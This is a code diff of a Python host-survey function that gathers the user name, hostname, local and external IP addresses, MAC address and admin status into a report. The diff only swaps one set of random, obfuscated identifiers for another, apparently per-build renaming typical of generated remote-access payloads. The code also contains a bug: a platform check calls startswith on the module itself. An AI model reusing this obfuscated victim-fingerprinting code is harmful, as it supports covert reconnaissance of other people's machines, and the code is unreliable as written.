@@ -6,33 +6,33 @@ import platform
 import socket
 import urllib
 import uuid
-def lbBccHiiDmGapnfkBzGcriIbWppvyzNz(plat_type):
-    eqLkAkBjgGjTGfPeDauGnluuVklQLyTG = platform.platform()
+def yMwanrVcSyabPBnwbJTWfwiTHZQnTJpc(plat_type):
+    wZNkWsTscJXplsBRhUgsTwQmxFPFQGaR = platform.platform()
     processor    = platform.processor()
     architecture = platform.architecture()[0]
-    kNtjcTmaUphPWqJHGfwMFJsJusUMFIyx = getpass.getuser()
-    ijxYzpttYCmNkIjDvYYHDZIxZwCgoSlz    = socket.gethostname()
-    FJJDnEjHDRLBxULFQMdiYnOHEobcGAeW        = socket.getfqdn()
-    XewTXXutMzoStpggiNmfNjOkaWqFtuYC = socket.gethostbyname(ijxYzpttYCmNkIjDvYYHDZIxZwCgoSlz)
-    vNbIFEIuqevaxwWVArcrgIquJDHzADrF     = uuid.getnode()
-    MjtIPFNnVjOLUbDguyKOlWxZKjiqSYKB         = ':'.join(("%012X" % vNbIFEIuqevaxwWVArcrgIquJDHzADrF)[tknkraSeKCplXonScDzEvCvHGHSEDAAX:tknkraSeKCplXonScDzEvCvHGHSEDAAX+2] for tknkraSeKCplXonScDzEvCvHGHSEDAAX in range(0, 12, 2))
-    YhRPaWdzrgmCkPoTWVAZKhRkWmfVfndt = [ 'ipinfo.io/ip', 'icanhazip.com', 'ident.me',
+    rSvThpkyEfMesCJqPDmAFaFvwvNNiNcy = getpass.getuser()
+    kBeYfcQkAcfJgsGbeglsgKIeEXkzHKoK    = socket.gethostname()
+    SPBRJGKHyWFlrSHmvkUIBGxEftXLHoSe        = socket.getfqdn()
+    tUEoEyuszeFjXYXnkwDOuIOAThtpoXiK = socket.gethostbyname(kBeYfcQkAcfJgsGbeglsgKIeEXkzHKoK)
+    pjErkdYuGCqfdMwSSeYJrKjadyufffgG     = uuid.getnode()
+    BEGcstbJaWVOwjecYyVtuWPCltcOdtwf         = ':'.join(("%012X" % pjErkdYuGCqfdMwSSeYJrKjadyufffgG)[jPdTGopJITvbSMDmzXVqrGvkRpQKswKQ:jPdTGopJITvbSMDmzXVqrGvkRpQKswKQ+2] for jPdTGopJITvbSMDmzXVqrGvkRpQKswKQ in range(0, 12, 2))
+    qwZbvbNJUpPaybfwufnvOkPIzObVjmZx = [ 'ipinfo.io/ip', 'icanhazip.com', 'ident.me',
                    'ipecho.net/plain', 'myexternalip.com/raw' ]
-    bWzMjYSPVDqxOvwJgHbKuXULOTsKnYXe = ''
-    for kZOAqfHfsupfmFHaHZnLDQEHpblqSUCA in YhRPaWdzrgmCkPoTWVAZKhRkWmfVfndt:
+    IaXJZwDBalkPkInXaqhPIHYINhRIMDPj = ''
+    for agiQWYdtFDyDNbELmUPwfeZwMrPuZFFh in qwZbvbNJUpPaybfwufnvOkPIzObVjmZx:
         try:
-            bWzMjYSPVDqxOvwJgHbKuXULOTsKnYXe = urllib.urlopen('http://'+kZOAqfHfsupfmFHaHZnLDQEHpblqSUCA).read().rstrip()
+            IaXJZwDBalkPkInXaqhPIHYINhRIMDPj = urllib.urlopen('http://'+agiQWYdtFDyDNbELmUPwfeZwMrPuZFFh).read().rstrip()
         except IOError:
             pass
-        if bWzMjYSPVDqxOvwJgHbKuXULOTsKnYXe and (6 < len(bWzMjYSPVDqxOvwJgHbKuXULOTsKnYXe) < 16):
+        if IaXJZwDBalkPkInXaqhPIHYINhRIMDPj and (6 < len(IaXJZwDBalkPkInXaqhPIHYINhRIMDPj) < 16):
             break
-    OiKcunAkxiNMgLHAbDPggXmrlUYgGOSn = False
+    apVZHIbwGtitliQAGpYfrkfYSHBIDyzE = False
     if plat_type.startswith('win'):
-        OiKcunAkxiNMgLHAbDPggXmrlUYgGOSn = ctypes.windll.shell32.IsUserAnAdmin() != 0
+        apVZHIbwGtitliQAGpYfrkfYSHBIDyzE = ctypes.windll.shell32.IsUserAnAdmin() != 0
     elif plat_type.startswith('linux') or platform.startswith('darwin'):
-        OiKcunAkxiNMgLHAbDPggXmrlUYgGOSn = os.getuid() == 0
-    cfjOMtHyAXIidgjFpwpHeIJKlFsdEBcP = 'Yes' if OiKcunAkxiNMgLHAbDPggXmrlUYgGOSn else 'No'
-    aeHabJpBgsEkaDKTTSDEgByVgAaKnAtJ = '''
+        apVZHIbwGtitliQAGpYfrkfYSHBIDyzE = os.getuid() == 0
+    RjCUjJkhvFhsmeZqDGXFrmzItBIPbWTU = 'Yes' if apVZHIbwGtitliQAGpYfrkfYSHBIDyzE else 'No'
+    CTpjsxTmqqvsuyxrhjoOBnEkWeINMxTn = '''
     System Platform     - {}
     Processor           - {}
     Architecture        - {}
@@ -43,6 +43,6 @@ def lbBccHiiDmGapnfkBzGcriIbWppvyzNz(plat_type):
     MAC Address         - {}
     Current User        - {}
     Admin Access        - {}
-    '''.format(eqLkAkBjgGjTGfPeDauGnluuVklQLyTG, processor, architecture,
-    ijxYzpttYCmNkIjDvYYHDZIxZwCgoSlz, FJJDnEjHDRLBxULFQMdiYnOHEobcGAeW, XewTXXutMzoStpggiNmfNjOkaWqFtuYC, bWzMjYSPVDqxOvwJgHbKuXULOTsKnYXe, MjtIPFNnVjOLUbDguyKOlWxZKjiqSYKB, kNtjcTmaUphPWqJHGfwMFJsJusUMFIyx, cfjOMtHyAXIidgjFpwpHeIJKlFsdEBcP)
-    return aeHabJpBgsEkaDKTTSDEgByVgAaKnAtJ
+    '''.format(wZNkWsTscJXplsBRhUgsTwQmxFPFQGaR, processor, architecture,
+    kBeYfcQkAcfJgsGbeglsgKIeEXkzHKoK, SPBRJGKHyWFlrSHmvkUIBGxEftXLHoSe, tUEoEyuszeFjXYXnkwDOuIOAThtpoXiK, IaXJZwDBalkPkInXaqhPIHYINhRIMDPj, BEGcstbJaWVOwjecYyVtuWPCltcOdtwf, rSvThpkyEfMesCJqPDmAFaFvwvNNiNcy, RjCUjJkhvFhsmeZqDGXFrmzItBIPbWTU)
+    return CTpjsxTmqqvsuyxrhjoOBnEkWeINMxTn
